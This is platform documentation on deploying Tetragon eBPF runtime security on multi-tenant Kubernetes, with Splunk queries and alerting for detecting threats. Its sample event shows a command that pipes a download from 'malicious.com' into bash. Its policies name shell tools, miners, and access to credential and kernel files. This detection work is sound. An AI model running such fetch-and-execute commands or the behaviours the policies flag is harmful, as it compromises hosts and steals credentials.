# Tetragon - eBPF-based Runtime Security

Tetragon provides runtime security monitoring and enforcement for Kubernetes workloads using eBPF (extended Berkeley Packet Filter). It monitors system calls, process execution, file access, and network activity to detect and prevent security threats.

## Why Tetragon?

Tetragon was chosen for fedCORE platform because:

1. **Built for Multi-Tenancy**: Monitors tenant boundary violations and privilege escalation
2. **Enforcement Capability**: Can block threats at the kernel level (not just alert)
3. **Cilium Integration**: If using Cilium CNI, Tetragon shares eBPF infrastructure
4. **Low Overhead**: eBPF-based, ~100-200MB RAM per node
5. **Splunk Integration**: Events export as JSON to stdout → Fluent Bit → Splunk

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│  Kubernetes Node                                         │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  ┌────────────────────────────────────────────────┐    │
│  │ Linux Kernel                                    │    │
│  │ ┌────────────────────────────────────────┐    │    │
│  │ │ eBPF Programs (loaded by Tetragon)     │    │    │
│  │ │ - security_file_open kprobe            │    │    │
│  │ │ - security_capset kprobe               │    │    │
│  │ │ - sys_enter_execve tracepoint          │    │    │
│  │ └────────────────────────────────────────┘    │    │
│  └────────────────────────────────────────────────┘    │
│                    │                                     │
│                    │ events                              │
│                    ▼                                     │
│  ┌────────────────────────────────────────────────┐    │
│  │ Tetragon Agent (DaemonSet)                     │    │
│  │ - Processes eBPF events                        │    │
│  │ - Applies TracingPolicy rules                  │    │
│  │ - Enforces (kill processes if needed)          │    │
│  │ - Exports JSON to stdout                       │    │
│  └────────────────────────────────────────────────┘    │
│                    │                                     │
│                    │ JSON logs                           │
│                    ▼                                     │
│  ┌────────────────────────────────────────────────┐    │
│  │ Fluent Bit (Splunk Connect)                    │    │
│  │ - Collects Tetragon stdout                     │    │
│  │ - Adds metadata (cluster, tenant)              │    │
│  │ - Sends to Splunk HEC                          │    │
│  └────────────────────────────────────────────────┘    │
│                                                          │
└─────────────────────────────────────────────────────────┘
                          │
                          │ HTTPS
                          ▼
┌─────────────────────────────────────────────────────────┐
│  Splunk (index=k8s_fedcore_security)                    │
│  sourcetype=tetragon:security                           │
└─────────────────────────────────────────────────────────┘
```

## TracingPolicies

Tetragon uses `TracingPolicy` custom resources to define what to monitor. The following policies are deployed automatically:

### 1. Tenant Boundary Violation Detection

**File:** `platform/components/tetragon/base/tetragon.yaml` (tenant-boundary-violation policy)

**What it detects:**
- Attempts to access other tenant's service account tokens
- Cross-namespace file access

**Example Splunk Alert:**
```spl
index=k8s_fedcore_security sourcetype=tetragon:security
policy_name="tenant-boundary-violation"
| stats count by tenant_name, pod_name, process_arguments
| where count > 0
```

**Response:**
- Logs event to Splunk for investigation
- Platform team investigates potential breach

### 2. Privilege Escalation Detection

**What it detects:**
- Linux capability changes (CAP_SYS_ADMIN, CAP_SYS_MODULE, etc.)
- Processes gaining dangerous capabilities

**Example Splunk Alert:**
```spl
index=k8s_fedcore_security sourcetype=tetragon:security
policy_name="privilege-escalation-detection"
capability IN ("CAP_SYS_ADMIN", "CAP_SYS_MODULE")
| table _time, tenant_name, pod_name, process_binary, capability
```

**Response:**
- Logs event to Splunk
- Alerts security team

### 3. Suspicious Process Execution

**What it detects:**
- Interactive shells (/bin/bash, /bin/sh)
- Network utilities (nc, wget, curl, ssh)
- Running in tenant namespaces (not system namespaces)

**Why this matters:**
Containers should run application processes, not shells. If a shell is spawned, it could indicate:
- Developer debugging (legitimate)
- Attacker gained access (security incident)
- Misconfigured deployment (should be fixed)

**Example Splunk Query:**
```spl
index=k8s_fedcore_security sourcetype=tetragon:security
policy_name="suspicious-process-execution"
process_binary IN ("/bin/bash", "/bin/sh", "/usr/bin/nc")
| stats count by tenant_name, namespace, pod_name, parent_process, process_binary
```

**Response:**
- Logs event to Splunk
- Platform team reviews context (debugging vs attack)

### 4. Cryptocurrency Mining Detection (ENFORCEMENT MODE)

**What it detects:**
- Known crypto mining binaries (xmrig, minerd, cpuminer, ethminer)

**Action:**
- **Sigkill**: Process is immediately terminated
- **Post**: Event logged to Splunk

**This is the only enforcement policy** - all others are detection-only.

**Example Splunk Query:**
```spl
index=k8s_fedcore_security sourcetype=tetragon:security
policy_name="crypto-mining-detection"
| stats count by tenant_name, pod_name, process_binary
```

### 5. Container Escape Detection

**What it detects:**
- Attempts to read kernel files (/proc/sys/kernel/, /sys/kernel/)
- Access to /dev/kmem, /dev/mem

**Response:**
- Logs event to Splunk
- Immediate security incident investigation

### Cloud-Specific Policies

#### AWS: IAM Credential Access Detection

**What it detects:**
- Access to Pod Identity service account tokens
- Access to ~/.aws/ directories

**Example Splunk Query:**
```spl
index=k8s_fedcore_security sourcetype=tetragon:security
policy_name="aws-pod-identity-access"
| stats count by tenant_name, namespace, pod_name, process_binary
```

#### Azure: Managed Identity Token Access Detection

**What it detects:**
- Access to Azure Workload Identity tokens

#### On-Prem: Host Filesystem Access Detection

**What it detects:**
- Attempts to access host-mounted filesystems (/hostfs/, /host/, /rootfs/)

## Event Format

Tetragon events are JSON-formatted with rich context:

```json
{
  "process_kprobe": {
    "process": {
      "exec_id": "...",
      "pid": 1234,
      "uid": 0,
      "cwd": "/app",
      "binary": "/bin/bash",
      "arguments": "-c 'curl http://malicious.com/payload.sh | bash'",
      "flags": "execve",
      "start_time": "2025-02-03T10:30:00Z",
      "pod": {
        "namespace": "acme-prod",
        "name": "web-app-7d8f9c5b-xh4ks",
        "container": {
          "id": "containerd://abc123",
          "name": "web",
          "image": {
            "name": "nexus.fedcore.io/tenant-acme/web:1.2.3"
          }
        },
        "pod_labels": {
          "app": "web",
          "capsule.clastix.io/tenant": "acme"
        }
      }
    },
    "parent": {
      "binary": "/usr/bin/node",
      "arguments": "app.js"
    },
    "policy_name": "suspicious-process-execution",
    "action": "KPROBE_ACTION_POST"
  },
  "node_name": "ip-10-0-1-23.ec2.internal",
  "time": "2025-02-03T10:30:00Z"
}
```

## Configuration

### Base Configuration

Location: `platform/components/tetragon/base/tetragon.yaml`

Key settings:
- **Driver**: eBPF (preferred over kernel module)
- **Export**: JSON to stdout (collected by Fluent Bit)
- **Rate Limiting**: 1000 events/second/node
- **Metrics**: Prometheus metrics enabled if `monitoring.enabled: true`
- **Resources**: 500m CPU / 500Mi RAM limit per node

### Cloud-Specific Overlays

Each cloud overlay adds cloud-specific metadata and policies:

- **AWS**: `overlays/aws/tetragon-aws.yaml`
  - Labels: `cloud=aws`, `aws-account-id`, `aws-region`
  - Extra policy: Pod Identity credential access detection

- **Azure**: `overlays/azure/tetragon-azure.yaml`
  - Labels: `cloud=azure`, `azure-subscription-id`
  - Extra policy: Managed Identity token access

- **On-Prem**: `overlays/onprem/tetragon-onprem.yaml`
  - Labels: `cloud=onprem`, `datacenter`, `rack`
  - Extra policy: Host filesystem access detection

## Deployment

Tetragon is deployed as part of the infrastructure artifact:

```bash
# Build infrastructure artifact (includes tetragon)
fedcore build platform/components/tetragon platform/clusters/fedcore-prod-use1

# Deploy to cluster
flux reconcile kustomization fedcore-prod-use1-infra --with-source
```

## Verification

### Check DaemonSet Status
```bash
kubectl get daemonset -n kube-system tetragon
# Should show running on all nodes
```

### Check TracingPolicies
```bash
kubectl get tracingpolicy -n kube-system
# Should show:
# - tenant-boundary-violation
# - privilege-escalation-detection
# - suspicious-process-execution
# - crypto-mining-detection
# - container-escape-detection
# - aws-pod-identity-access (AWS only)
```

### Verify Events in Splunk
```spl
index=k8s_fedcore_security sourcetype=tetragon:security
| stats count by policy_name, cluster_name
```

### Test Detection (Optional)

**WARNING: Only test in non-production cluster (fedcore-lab-01)**

```bash
# Create test pod in tenant namespace
kubectl run test-shell --image=alpine -n acme-dev -- sleep 3600

# Exec into pod (should trigger suspicious-process-execution)
kubectl exec -n acme-dev test-shell -- /bin/sh -c 'echo test'

# Check Splunk for event within 30 seconds
```

## Tuning and Customization

### Reduce Noise: Exclude Legitimate Processes

If certain applications legitimately spawn shells (e.g., init containers), exclude them:

```yaml
# Edit suspicious-process-execution policy
spec:
  tracepoints:
  - selectors:
    - matchBinaries:
      - operator: "NotIn"
        values:
        - "/usr/bin/kubectl"  # Add exclusions here
```

### Add Custom Policies

Create additional `TracingPolicy` resources in cluster-specific overlays:

```yaml
# platform/components/tetragon/overlays/aws/custom-policy.yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-aws-cli-usage
  namespace: kube-system
spec:
  tracepoints:
  - subsystem: "syscalls"
    event: "sys_enter_execve"
    selectors:
    - matchArgs:
      - index: 0
        operator: "Equal"
        values:
        - "/usr/local/bin/aws"  # Detect AWS CLI usage
      matchActions:
      - action: Post
```

### Increase Rate Limit

If legitimate workloads generate high event volume:

```yaml
# In overlay
export:
  rateLimitOptions:
    rate: 5000  # Increase from 1000
```

## Splunk Dashboards

### Security Overview Dashboard

```spl
index=k8s_fedcore_security sourcetype=tetragon:security
| stats count by policy_name, cluster_name
| sort -count
```

### Tenant Security Posture

```spl
index=k8s_fedcore_security sourcetype=tetragon:security
| spath path=process_kprobe.process.pod.pod_labels{capsule.clastix.io/tenant} output=tenant_name
| stats count by tenant_name, policy_name
| sort -count
```

### Real-Time Threat Feed

```spl
index=k8s_fedcore_security sourcetype=tetragon:security
| eval severity=case(
    policy_name=="crypto-mining-detection", "CRITICAL",
    policy_name=="container-escape-detection", "CRITICAL",
    policy_name=="privilege-escalation-detection", "HIGH",
    policy_name=="tenant-boundary-violation", "HIGH",
    policy_name=="suspicious-process-execution", "MEDIUM",
    1=1, "INFO"
  )
| table _time, severity, policy_name, tenant_name, pod_name, process_binary
| sort -_time
```

## Alerting

Create Splunk alerts for critical events:

### Critical: Crypto Mining Detected

```spl
index=k8s_fedcore_security sourcetype=tetragon:security
policy_name="crypto-mining-detection"
| stats count by tenant_name, pod_name
```

**Alert Trigger**: Any event (threshold: count > 0)
**Actions**:
- Send to PagerDuty
- Email security team
- Create incident ticket

### High: Container Escape Attempt

```spl
index=k8s_fedcore_security sourcetype=tetragon:security
policy_name="container-escape-detection"
| stats count by tenant_name, pod_name
```

**Alert Trigger**: Any event
**Actions**:
- Send to PagerDuty
- Email security team

### Medium: Suspicious Shell Activity

```spl
index=k8s_fedcore_security sourcetype=tetragon:security
policy_name="suspicious-process-execution"
process_binary IN ("/bin/bash", "/bin/sh")
| stats count by tenant_name, pod_name
| where count > 10  # Alert if > 10 shells in 5 minutes
```

**Alert Trigger**: More than 10 shell executions in 5 minutes
**Actions**:
- Email platform team for investigation

## Troubleshooting

### No Events in Splunk

1. **Check Tetragon DaemonSet:**
   ```bash
   kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon
   ```

2. **Verify TracingPolicies are loaded:**
   ```bash
   kubectl get tracingpolicy -n kube-system
   kubectl describe tracingpolicy tenant-boundary-violation -n kube-system
   ```

3. **Check Fluent Bit is collecting Tetragon logs:**
   ```bash
   kubectl logs -n splunk-system -l app=fluent-bit | grep tetragon
   ```

### High CPU/Memory Usage

Tetragon default limits: 500m CPU, 500Mi RAM

If experiencing resource pressure:
1. Check event rate: `kubectl top pod -n kube-system -l app.kubernetes.io/name=tetragon`
2. Reduce rate limit or add exclusions to noisy policies
3. Increase resource limits in overlay

### False Positives

**Legitimate shell usage:**
- Init containers often run shells
- Some applications (CI/CD agents) legitimately spawn shells

**Solution:** Add exclusions to `suspicious-process-execution` policy

## Security Considerations

1. **Privileged DaemonSet**: Tetragon runs privileged to load eBPF programs
   - Required for kernel-level monitoring
   - Runs in `kube-system` namespace
   - Protected by Kyverno policies

2. **Event Flooding**: Rate limited to 1000 events/second/node
   - Prevents log flooding attacks
   - Prevents Splunk ingestion overload

3. **Enforcement vs Detection**: Only crypto mining uses enforcement (Sigkill)
   - All other policies are detection-only
   - Prevents breaking legitimate workloads
   - Security team investigates alerts

4. **eBPF Verification**: All eBPF programs are verified by kernel
   - Cannot crash kernel
   - Cannot leak memory
   - Sandboxed execution

## Resources

- [Tetragon Documentation](https://tetragon.io/)
- [Cilium/Tetragon GitHub](https://github.com/cilium/tetragon)
- [TracingPolicy Reference](https://tetragon.io/docs/concepts/tracing-policy/)
- [eBPF Introduction](https://ebpf.io/)
